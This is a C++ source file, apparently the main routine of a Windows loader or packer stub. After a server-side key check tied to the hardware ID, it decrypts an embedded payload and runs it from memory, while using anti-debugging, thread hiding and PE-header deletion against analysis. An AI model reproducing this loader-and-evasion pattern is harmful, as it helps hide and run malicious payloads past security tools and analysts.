#include "pch.h"

#include "AntiDebugging.hpp"
#include "AntiDumping.hpp"
#include "ServerRequests.hpp"
#include "PayloadManager.hpp"
#include "Identification.hpp"
#include "RunProcess.hpp"

#ifndef _DEBUG
// IF RELEASE
#pragma optimize("x", on)
#endif // !_DEBUG

int APIENTRY wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nCmdShow) {
    FILE* cmdOUT = Logging::InitConsole();
    RunImp* dImp = RunImp::GetInstance(); 


    // Init Antidebugging
    AntiDebugging antiDbg;
#ifndef _DEBUG
    // Hide this thread
    AntiDebugging::HideThread(dImp->dGetCurrentThread());
#endif // !_DEBUG
    antiDbg.start();


    antiDbg.KillIfIntegrityCheckFails();
    PayloadManager* payloadManager = new PayloadManager();


    antiDbg.KillIfIntegrityCheckFails();
    string response = ServerRequests::GetDecryptKey(payloadManager->GetProjectId(), Identification::GetHWID());


    // Error handling
    if (response.length() <= 0) {
#ifdef _DEBUG
        LOG("[Error] Empty HTTP response from server, failed auth", Logging::Red);
        antiDbg.stop();
        system("pause");
#endif // !_DEBUG
        exit(-6);
    };


    antiDbg.KillIfIntegrityCheckFails();
    vector<BYTE>* dPayload = payloadManager->GetDecryptedPayload(response);

    LOG("First 3 bytes of decrypted payload: " + dPayload->data()[0] + dPayload->data()[1] + dPayload->data()[2], Logging::Green);


    antiDbg.KillIfIntegrityCheckFails();
    RunProcess* runProcess = new RunProcess();
    runProcess->RunProcessFromMemory(dPayload, payloadManager->GetOEP());

    atomic<bool> integrityCheckRunning = true;
    thread checkIntegrity = thread([&]() {
        while (integrityCheckRunning) {
            antiDbg.KillIfIntegrityCheckFails();
            Sleep(1000);
        }
    });


    // Delete own PE header
    AntiDumping::DeletePEHeader();

    // Clear memory
    delete runProcess;
    delete payloadManager;

    // Wait for thread to finish
    integrityCheckRunning = false;
    checkIntegrity.join();

    // Destroy console
    Logging::DestroyConsole(cmdOUT);

    return 0;

}
